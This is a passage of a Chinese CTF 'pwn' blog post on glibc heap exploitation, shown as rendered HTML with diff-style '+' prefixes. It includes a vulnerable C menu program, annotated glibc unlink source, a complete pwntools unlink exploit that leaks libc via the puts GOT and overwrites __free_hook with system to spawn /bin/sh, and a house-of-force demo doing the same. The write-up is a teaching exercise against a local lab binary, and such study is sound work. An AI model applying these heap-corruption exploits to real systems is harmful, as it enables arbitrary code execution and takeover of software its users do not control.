class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> size_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_int</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind &gt;=<span class="hljs-number">20</span> || chunk_list[ind]!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input size:&quot;</span>);<br>    <span class="hljs-type">int</span> size=get_int();<br>    <span class="hljs-keyword">if</span> (size&lt;=<span class="hljs-number">0</span> || size&gt;<span class="hljs-number">2048</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    chunk_list[ind]=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    chunk_list[ind][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>    size_list[ind]=size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(chunk_list[ind]);<br>    chunk_list[ind]=<span class="hljs-number">0</span>;<br>    size_list[ind]=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(chunk_list[ind]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> * buf=chunk_list[ind];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input data:&quot;</span>);<br>    buf[read(<span class="hljs-number">0</span>,buf,size_list[ind])]=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. create&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> get_int();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">switch</span>(menu())&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    add();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    delete();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    edit();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    show();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error mode&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ; <br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="unlink代码分析">unlink代码分析</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">unlink_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br> <br>  <span class="hljs-keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br>    <span class="hljs-comment">// 先检验chunk附近的堆布局是否合法</span><br>  mchunkptr fd = p-&gt;fd;<br>  mchunkptr bk = p-&gt;bk;<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br>    <span class="hljs-comment">// 检测双向链表是否合法  最重要的条件</span><br>    <br>  fd-&gt;bk = bk;<br>  bk-&gt;fd = fd;<br>  <span class="hljs-comment">// 将双向链表中的P 删除</span><br>  <br>  <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">//当chunk属于large bin时，还需要将chunk从 nextsize双向链表中删除</span><br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>	malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br>        <br>      <span class="hljs-keyword">if</span> (fd-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)<br>	&#123;<br>	  <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize == p)<br>	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>	  <span class="hljs-keyword">else</span><br>	    &#123;<br>	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>	    &#125;<br>	&#125;<br>      <span class="hljs-keyword">else</span><br>	&#123;<br>	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>      <span class="hljs-comment">// 如果size 链表不为空，则直接将P 删除</span><br>	&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="unlink-示例分析">unlink 示例分析</h3>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink-3.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink-4.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    程序中的edit中存在off by null</span><br><span class="hljs-string">    而且程序没有开启pie保护，</span><br><span class="hljs-string">    这说明我们已知的地址中有一个区域储存了chunk的地址</span><br><span class="hljs-string">    这样就可以构造</span><br><span class="hljs-string">    *(chunk-&gt;fd+0x18)=chunk</span><br><span class="hljs-string">    *(chunk-&gt;bk+0x10)=chunk</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">en_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br>p=process(<span class="hljs-string">&#x27;./unlink&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./unlink&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>puts_got=e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>chunk_list=<span class="hljs-number">0x4040a0</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x4f8</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x58</span>)<br>chunk_list_2=chunk_list+<span class="hljs-number">0x10</span><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x51</span>)+p64(chunk_list_2-<span class="hljs-number">0x18</span>)+p64(chunk_list_2-<span class="hljs-number">0x10</span>)<br>payload=payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(<span class="hljs-number">0x50</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    因为chunklist中储存的时chunk+0x10，所以我们需要先伪造chunk</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>edit(<span class="hljs-number">2</span>,payload)<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)+p64(puts_got))<br>show(<span class="hljs-number">0</span>)<br>libc_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=libc_d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)+p64(free_hook))<br>edit(<span class="hljs-number">0</span>,p64(system))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;/bin/sh\00&#x27;</span>)<br>free(<span class="hljs-number">4</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="house-of-force">house of force</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    在top chunk的size为unsigned long long int类型，</span><br><span class="hljs-comment">    所以如果存在堆溢出，可以修改topchunk的大小，则可以修改大小为-1</span><br><span class="hljs-comment">    设需要创建chunk的位置为x</span><br><span class="hljs-comment">    则只需要创建一个 x-top_chunk-0x20 大小的chunk</span><br><span class="hljs-comment">    再次创建chunk，chunk的地址就为x所在地址的附近了</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    在新版的libc中，在使用top chunk分裂获取chunk时，</span><br><span class="hljs-comment">    对top chunk的大小进行了检测，导致无法利用house of force</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/* ubuntu16.04</span><br><span class="hljs-comment">    gcc house_of_force.c -pie -out house_of_force</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span>  *a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>    a[<span class="hljs-number">3</span>]=<span class="hljs-number">-1</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> sys=system;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> top=a;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> free_hook=sys+<span class="hljs-number">0x381408</span>;<br>    top+=<span class="hljs-number">0x10</span>;<br>    <span class="hljs-type">char</span> *b=<span class="hljs-built_in">malloc</span>(free_hook-top<span class="hljs-number">-0x20</span>);<br>    <span class="hljs-built_in">memcpy</span>(b,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>,<span class="hljs-number">8</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *c=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>    c[<span class="hljs-number">1</span>]=system;<br>    <span class="hljs-built_in">free</span>(b);<br>&#125;<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/heap/" class="category-chain-item">heap</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/">#ctf</a>
+      
+        <a href="/tags/pwn/">#pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>攻击方法一</div>
+      <div>https://rot-will.github.io/page/heap/攻击方法一/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>rot_will</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月22日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年10月15日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                <i class="iconfont icon-nc"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                <i class="iconfont icon-nd"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/page/heap/%E5%A0%86%E5%9F%BA%E7%A1%80/" title="堆基础">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">堆基础</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/page/heap/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%BA%8C/" title="攻击方法二">
+                        <span class="hidden-mobile">攻击方法二</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments">
+    
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"rot-will/rot-will.github.io","repo-id":"R_kgDOHgxmbg","category":"Announcements","category-id":"DIC_kwDOHgxmbs4CPuLX","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+    <script src="/lib/page-time.js"></script>
+  
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    
+      <script  src="/js/img-lazyload.js" ></script>
+    
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
